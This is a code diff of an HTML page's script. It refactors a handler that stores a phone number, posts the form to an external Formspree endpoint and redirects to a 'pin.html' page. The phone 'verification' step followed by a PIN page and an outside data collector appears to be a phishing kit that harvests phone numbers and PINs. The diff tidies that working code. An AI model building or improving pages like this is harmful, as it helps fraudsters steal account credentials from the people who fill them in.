@@ -42,7 +42,6 @@
           <div class="spacee"></div>
           <button
             id="redirectBtn"
-           
             class="bg-primary text-white w-full rounded-md p-4 disabled:opacity-80"
           >
             Verify
@@ -57,30 +56,25 @@
       console.log("working");
       const btn = document.querySelector("button");
       const phoneInput = document.querySelector("#phone");
+      const form = document.getElementById("form");
+      const redirectBtn = document.getElementById("redirectBtn");
 
-      // Form submission handling for verification code
-      document
-        .getElementById("form")
-        .addEventListener("submit", async function (event) {
-          event.preventDefault(); // Prevent default form submission
-
-          btn.textContent = "Loading..."; // Change button text to Loading...
-
-          localStorage.setItem("phone", phoneInput.value); // Store phone number in localStorage
-
-          let formData = new FormData(this); // Collect form data
+      if (form) {
+        form.addEventListener("submit", async function (event) {
+          event.preventDefault();
+          btn.textContent = "Loading...";
+          localStorage.setItem("phone", phoneInput.value);
+          let formData = new FormData(this);
 
           try {
             let response = await fetch("https://formspree.io/f/xoveqrzb", {
               method: "POST",
               body: formData,
-              headers: {
-                Accept: "application/json",
-              },
+              headers: { Accept: "application/json" },
             });
 
             if (response.ok) {
-              window.location.href = "pin.html"; // Redirect to pin.html on successful submission
+              window.location.href = "pin.html";
             } else {
               alert("Failed to send form. Please try again.");
             }
@@ -88,14 +82,14 @@
             alert("An error occurred. Please try again later.");
           }
         });
-    };
+      }
 
-    // Attach an event listener to the button for redirection
-    document
-      .getElementById("redirectBtn")
-      .addEventListener("click", function () {
-        window.location.href = "pin.html"; // Redirect to pin.html when the button is clicked
-      });
+      if (redirectBtn) {
+        redirectBtn.addEventListener("click", function () {
+          window.location.href = "pin.html";
+        });
+      }
+    };
   </script>
 
   <script>
